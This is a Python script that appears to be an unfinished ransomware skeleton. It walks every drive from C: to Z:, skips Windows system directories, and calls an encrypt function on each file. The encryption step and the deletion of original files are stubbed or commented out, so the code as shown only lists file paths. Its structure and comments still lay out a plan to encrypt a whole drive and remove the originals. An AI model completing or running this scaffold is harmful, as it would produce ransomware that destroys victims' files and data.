import os
from pathlib import Path
import sys


def encrypt_file(file_path, key):
    
    encrypted_file_path=[]


    encrypted_file_path.append(file_path)

    #encrypted_file_path = file_path + ".enc"

     #   encrypted_file.write(encrypted)
    return encrypted_file_path

def encrypt_files_in_drive(drive, exclude_dirs, key):
    #Encrypt all files in a given drive, except for excluded directories
    encrypted_files = []
    drive_path = f'{drive}:\\'
    if os.path.exists(drive_path):
        for root, dirs, files in os.walk(drive_path):
            # Exclude system directories
            dirs[:] = [d for d in dirs if os.path.join(root, d) not in exclude_dirs]

            for file in files:
                file_path = os.path.join(root, file)
                encrypted_file_path = encrypt_file(file_path, key)  #function call
                encrypted_files.append(encrypted_file_path) 
                # replace or remove the original file after encryption
                # os.remove(file_path)
    return encrypted_files

if __name__ == "__main__":

    encryption_key='aevfvaeve'

    # Define system directories to exclude for Windows
    exclude_dirs = [
        r'C:\Windows', r'C:\Program Files', r'C:\Program Files (x86)', r'C:\Users\Default',
        r'C:\Users\Public', r'C:\ProgramData',r'C:\Users\USER', sys.prefix  # Exclude Python's directory 
        #add the current file name etc
    ]

    # Encrypt files on all available drives (C: to Z:)
    all_encrypted_files = []
    for drive in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
        encrypted_files = encrypt_files_in_drive(drive, exclude_dirs, encryption_key)
        all_encrypted_files.extend(encrypted_files)

    print("Encryption complete. Encrypted files:")
    for file in all_encrypted_files:
        print(file)
